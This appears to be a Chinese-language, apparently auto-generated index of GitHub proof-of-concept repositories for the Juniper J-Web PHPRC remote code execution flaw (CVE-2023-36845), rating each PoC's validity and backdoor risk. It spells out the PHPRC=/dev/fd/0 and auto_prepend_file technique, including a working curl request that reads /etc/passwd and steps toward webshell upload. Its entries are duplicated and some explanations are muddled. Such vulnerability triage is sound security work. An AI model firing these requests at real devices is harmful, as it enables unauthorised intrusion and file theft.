2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

